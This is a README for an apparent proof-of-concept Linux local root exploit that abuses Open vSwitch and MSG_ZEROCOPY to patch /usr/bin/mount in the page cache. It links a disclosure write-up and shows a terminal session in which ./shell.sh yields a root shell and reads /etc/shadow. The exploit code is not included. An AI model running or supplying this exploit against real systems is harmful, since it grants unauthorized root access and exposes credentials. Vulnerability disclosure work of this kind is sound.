# ovs-pagecache-write

Unprivileged local root via Open vSwitch: a `MSG_ZEROCOPY` page reaches the OVS
datapath still mapped to its page-cache page, and the kernel writes into it.
Arbitrary modification of any file the user can open for *reading* - here
`/usr/bin/mount`.

Write-up: https://blog.doyensec.com/2026/09/17/ovs.html

```
[tbnz@ip-172-31-19-3 ovs-pagecache-write]$ id
uid=1001(tbnz) gid=1001(tbnz) groups=1001(tbnz) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

[tbnz@ip-172-31-19-3 ovs-pagecache-write]$ uname -a
Linux ip-172-31-19-3.ec2.internal 6.18.44-99.149.amzn2023.x86_64 #2 SMP PREEMPT_DYNAMIC Tue Aug 25 21:16:03 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux

[tbnz@ip-172-31-19-3 ovs-pagecache-write]$ sha1sum /usr/bin/mount
7f204070bd1809c93a9c432386c9dc12f51cd0d0  /usr/bin/mount

[tbnz@ip-172-31-19-3 ovs-pagecache-write]$ ./shell.sh
    DP_NEW tdp0    -> OK (0)
    VPORT_NEW      -> OK (0)
    FLOW_NEW       -> OK (0)
[encap] udp/4500 armed for ESP-in-UDP
[*] /usr/bin/mount patched in page cache — root shell (Ctrl-D to exit and restore):

[root@ip-172-31-19-3 ovs-pagecache-write]# sha1sum /usr/bin/mount
c3dcb23d29ff79086e8f00858a282d74946e2fe8  /usr/bin/mount

[root@ip-172-31-19-3 ovs-pagecache-write]# id
uid=0(root) gid=1001(tbnz) groups=1001(tbnz) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

[root@ip-172-31-19-3 ovs-pagecache-write]# head -1 /etc/shadow
root:*LOCK*:14600::::::

[root@ip-172-31-19-3 ovs-pagecache-write]# exit
exit
[+] evicted page cache for /usr/bin/mount -> on-disk content restored

[tbnz@ip-172-31-19-3 ovs-pagecache-write]$ sha1sum /usr/bin/mount
7f204070bd1809c93a9c432386c9dc12f51cd0d0  /usr/bin/mount
```

Page cache only - on-disk content untouched, restored on exit.

## Run

```sh
./shell.sh
```

Needs `unshare -Urn` and a loadable `openvswitch`.
